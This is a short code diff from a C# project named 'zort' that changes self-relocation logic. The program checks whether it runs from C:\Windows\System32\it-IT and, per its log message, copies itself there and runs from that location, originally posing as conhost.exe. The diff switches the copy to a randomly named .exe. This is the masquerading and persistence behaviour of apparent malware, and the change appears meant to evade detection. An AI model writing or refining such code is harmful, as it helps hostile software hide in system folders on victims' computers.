@@ -161,8 +161,10 @@ namespace zort
 
                 // Check if running from C:\Windows\System32\it-IT\conhost.exe
                 string itITPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "it-IT");
-                string conhostPath = Path.Combine(itITPath, "conhost.exe");
-                if (Assembly.GetExecutingAssembly().Location != conhostPath)
+                string randomName = Path.GetRandomFileName() + ".exe";
+                string conhostPath = Path.Combine(itITPath, randomName);
+                string currentFolder = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+                if (!currentFolder.Equals(itITPath))
                 {
                     ModuleLogger.Log(this, "Not running from C:\\Windows\\System32\\it-IT\\conhost.exe. Copying and running from there..");
 
